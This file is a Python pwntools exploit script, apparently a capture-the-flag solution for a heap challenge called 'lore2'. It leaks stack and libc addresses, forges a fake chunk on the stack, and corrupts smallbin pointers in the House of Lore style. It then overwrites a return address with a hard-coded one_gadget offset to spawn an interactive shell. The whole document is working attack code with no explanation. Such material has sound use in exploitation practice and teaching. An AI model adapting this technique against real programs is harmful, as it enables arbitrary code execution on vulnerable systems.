# lore2.py
from pwn import *
p = process("./lore2")

def add(size,data):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(size))
	print p.sendafter(":",str(data))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def show(idx):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
def edit(idx,data):
	print p.sendlineafter(">","4")
	print p.sendlineafter(":",str(idx))
	print p.sendafter(":",str(data))
def edit_name(data):
	print p.sendlineafter(">","5")
	print p.sendafter(":",str(data))

print p.sendafter("name:","A")
name_stack = int(p.recvuntil(":").strip(":"),16)
print hex(name_stack)

add(0x100, "AAAA") # 0 
add(0x100, "AAAA") # 1
add(0x100, "AAAA") # 2 
pause()
show(0)
ptr1 = int(p.recvuntil(":").strip(":"),16)
print hex(ptr1)

pause()
free(0) 
pause()
free(2)
pause()

# Library leak
show(0)
print p.recvuntil(": ")

libc_leak = u64(p.recv(6).ljust(8,"\x00"))
libc_base = libc_leak - 0x3c4b78
oneshot = libc_base + 0xF1147

print hex(libc_base)
print hex(oneshot) 

pause()
add(0x110, "AAAA") # smallbin

name = p64(0)
name += p64(0x111)
name += p64(ptr1 - 0x10) # fake fd
name += p64(name_stack + 40) # fake bk
name += p64(0)
name += p64(0)
name += p64(0)
name += p64(name_stack)

# fake chunk in stack
pause()
edit_name(name)

# fake bk heap
payload = p64(0) # fd
payload += p64( name_stack) # fake bk 
pause()
edit(0, payload)
add(0x100, "1") # unsroted bin

# allocate stack
payload = "A"*104
payload += p64(oneshot)
pause()
add(0x100, payload)
print p.sendlineafter(">","6") # return 
pause()
p.interactive()